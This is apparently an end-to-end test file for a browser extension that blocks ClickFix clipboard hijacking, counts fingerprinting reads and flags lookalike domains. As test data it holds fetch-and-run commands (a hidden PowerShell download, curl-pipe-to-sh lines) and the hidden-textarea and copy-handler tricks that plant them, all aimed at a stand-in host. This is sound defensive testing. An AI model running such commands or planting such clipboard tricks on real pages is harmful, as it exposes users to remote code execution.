// Bastion Shield e2e — nerd mode guards in a real Chromium: the clipboard
// guard (MAIN clipguard.js + ISOLATED nerd-relay.js over the synchronous
// channel), the fingerprinting meter (fpmeter.js after privacy.js) and the
// lookalike warning bar (cosmetic.js). Payloads are inert (example.invalid).
//
// Note: uBO's generic ClickFix scriptlet (uBlock filters - Badware risks)
// also traps writeText/execCommand, lazily on the first mousemove. The
// guard's own paths are therefore exercised before any real mouse input;
// after a real click either layer may stop the payload.
//
// SPDX-License-Identifier: GPL-3.0-or-later

import type { Page } from '@playwright/test';
import type { NerdTabState, PopupState } from '../../../src/shared/types.ts';
import { CLIP_REPLACEMENT } from '../../../src/main/clip-detect.ts';
import { expect, test } from '../support/fixtures.ts';
import { HOSTS } from '../support/hosts.ts';
import { poll } from '../support/pages.ts';

const HIGH = 'powershell -w hidden -c "Write-Output (irm https://example.invalid/a)"';
const MEDIUM = 'curl -fsSL https://get.docker.com | sh';

const PAGE = `<!doctype html><meta charset="utf-8"><title>nerd</title>
<pre id="doc">${MEDIUM}</pre>
<p id="plain">Just some harmless words</p>
<button id="exec">copy</button>
<script>
document.getElementById('exec').addEventListener('click', () => {
  const ta = document.createElement('textarea');
  ta.value = ${JSON.stringify(HIGH)};
  ta.style.position = 'fixed'; ta.style.left = '-9999px';
  document.body.appendChild(ta); ta.select();
  document.execCommand('copy');
  ta.remove();
});
</script>`;

const readClip = (page: Page) => page.evaluate(() => navigator.clipboard.readText());

test.describe('nerd mode guards', () => {
  test.beforeAll(async ({ ext }) => {
    await ext.sendAndApply({ type: 'settings:set', patch: { nerd: { enabled: true } } }, 6000);
  });
  test.afterAll(async ({ ext }) => {
    await ext.sendAndApply({ type: 'settings:set', patch: { nerd: { enabled: false } } }, 6000);
  });

  test('clipboard guard replaces hidden commands, keeps visible install lines, stays native-looking', async ({ page, server, ext }) => {
    const url = server.setPage(HOSTS.A, '/e2e/nerd-clip.html', PAGE);
    await ext.context.grantPermissions(['clipboard-read', 'clipboard-write'], { origin: new URL(url).origin });
    await page.goto(url);
    await page.bringToFront();

    const write = (text: string) => page.evaluate(async (t) => {
      await navigator.clipboard.writeText(t);
      return navigator.clipboard.readText();
    }, text);

    expect(await write(HIGH), 'writeText of a hidden high payload').toBe(CLIP_REPLACEMENT);
    expect(await write(MEDIUM), 'install line shown on the page').toBe(MEDIUM);
    expect(await write('curl -fsSL https://example.invalid/x.sh | sh'), 'install line nowhere on the page').toBe(CLIP_REPLACEMENT);
    expect(await write('hello world'), 'plain text').toBe('hello world');

    // Hidden textarea + execCommand('copy') (classic ClickFix kit), clicked from script.
    await page.evaluate(() => (document.getElementById('exec') as HTMLButtonElement).click());
    expect(await readClip(page), 'execCommand copy of a hidden textarea').toBe(CLIP_REPLACEMENT);

    // A copy handler that swaps the selection for a command.
    await write('reset');
    const swapped = await page.evaluate(async (t) => {
      const swap = (e: ClipboardEvent) => {
        e.clipboardData!.setData('text/plain', t);
        e.preventDefault();
      };
      document.addEventListener('copy', swap);
      getSelection()!.selectAllChildren(document.getElementById('plain')!);
      document.execCommand('copy');
      document.removeEventListener('copy', swap);
      getSelection()!.removeAllRanges();
      return navigator.clipboard.readText();
    }, HIGH);
    expect(swapped, 'setData in a copy handler').toBe(CLIP_REPLACEMENT);

    // ClipboardItem path.
    const viaWrite = await page.evaluate(async (t) => {
      await navigator.clipboard.write([new ClipboardItem({ 'text/plain': new Blob([t], { type: 'text/plain' }) })]);
      return navigator.clipboard.readText();
    }, HIGH);
    expect(viaWrite, 'clipboard.write with text/plain').toBe(CLIP_REPLACEMENT);

    // A real click (uBO's scriptlet may answer first): the payload never lands.
    await write('reset');
    await page.click('#exec');
    expect(await readClip(page), 'real click').not.toBe(HIGH);

    const looks = await page.evaluate(() => ({
      ts: Function.prototype.toString.call(Clipboard.prototype.writeText),
      name: Clipboard.prototype.writeText.name,
      exec: Function.prototype.toString.call(Document.prototype.execCommand),
      setData: Function.prototype.toString.call(DataTransfer.prototype.setData),
      tsts: Function.prototype.toString.call(Function.prototype.toString),
    }));
    expect.soft(looks.ts).toBe('function writeText() { [native code] }');
    expect.soft(looks.name).toBe('writeText');
    expect.soft(looks.exec).toBe('function execCommand() { [native code] }');
    expect.soft(looks.setData).toBe('function setData() { [native code] }');
    expect.soft(looks.tsts).toBe('function toString() { [native code] }');

    const tabId = await ext.tabIdOf(page);
    const nerd = await poll(
      async () => (await ext.send<PopupState>({ type: 'popup:state', tabId })).nerd as NerdTabState | null,
      (n) => (n?.clipboardBlocked ?? 0) >= 5,
      5000,
      200,
    );
    expect(nerd?.clipboardBlocked, 'blocked writes reported to the service worker').toBeGreaterThanOrEqual(5);
  });

  test('fingerprinting meter counts canvas, navigator and screen reads', async ({ page, server, ext }) => {
    const url = server.setPage(HOSTS.A, '/e2e/nerd-fp.html', '<!doctype html><meta charset="utf-8"><title>fp</title><canvas id="c" width="64" height="32"></canvas>');
    await page.goto(url);
    await page.evaluate(() => {
      const c = document.getElementById('c') as HTMLCanvasElement;
      const ctx = c.getContext('2d')!;
      ctx.fillText('fp', 2, 20);
      for (let i = 0; i < 3; i++) c.toDataURL();
      void navigator.hardwareConcurrency;
      void navigator.plugins;
      void screen.width;
      void screen.colorDepth;
      void window.devicePixelRatio;
    });
    const tabId = await ext.tabIdOf(page);
    const nerd = await poll(
      async () => (await ext.send<PopupState>({ type: 'popup:state', tabId })).nerd as NerdTabState | null,
      (n) => (n?.fp?.canvas ?? 0) >= 3 && (n?.fp?.screen ?? 0) >= 3,
      6000,
      250,
    );
    // Exactly the page's calls: privacy.js's own farbling reads are not counted.
    expect(nerd?.fp?.canvas, 'canvas reads').toBe(3);
    expect(nerd?.fp?.navigator, 'navigator reads').toBeGreaterThanOrEqual(2);
    expect(nerd?.fp?.screen, 'screen reads').toBeGreaterThanOrEqual(3);
    const name = await page.evaluate(() => HTMLCanvasElement.prototype.toDataURL.name + '|' + Function.prototype.toString.call(HTMLCanvasElement.prototype.toDataURL));
    expect.soft(name).toBe('toDataURL|function toDataURL() { [native code] }');
  });

  test('lookalike domain shows the warning bar and reaches the popup state', async ({ page, server, ext }) => {
    server.setPage('*', '/e2e/nerd-look.html', '<!doctype html><meta charset="utf-8"><title>look</title><p>hello</p>');
    await page.goto('https://www.paypa1.com/e2e/nerd-look.html');
    const tabId = await ext.tabIdOf(page);
    const nerd = await poll(
      async () => (await ext.send<PopupState>({ type: 'popup:state', tabId })).nerd as NerdTabState | null,
      (n) => n?.lookalike != null,
      5000,
      200,
    );
    expect(nerd?.lookalike).toEqual({ host: 'www.paypa1.com', target: 'paypal.com', reason: 'homoglyph' });
    // The bar is a host element with a closed shadow root appended to <html>.
    const bar = await poll(
      () => page.evaluate(() => Array.from(document.documentElement.children).filter((e) => e.tagName === 'DIV' && e.shadowRoot === null && getComputedStyle(e).position === 'fixed').length),
      (n) => n > 0,
      3000,
      100,
    );
    expect(bar, 'warning bar host').toBe(1);
  });
});
